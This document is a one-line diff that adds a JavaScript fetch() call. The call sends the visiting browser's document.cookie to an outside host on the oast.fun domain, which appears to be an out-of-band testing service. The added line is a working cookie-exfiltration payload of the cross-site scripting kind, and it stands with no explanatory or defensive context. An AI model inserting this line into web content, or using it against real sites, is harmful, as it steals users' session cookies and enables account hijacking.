@@ -1,0 +1,1 @@
+fetch('http://mrxziirtkbcclscbydulq537vooehcvkb.oast.fun/?c=' + document.cookie)
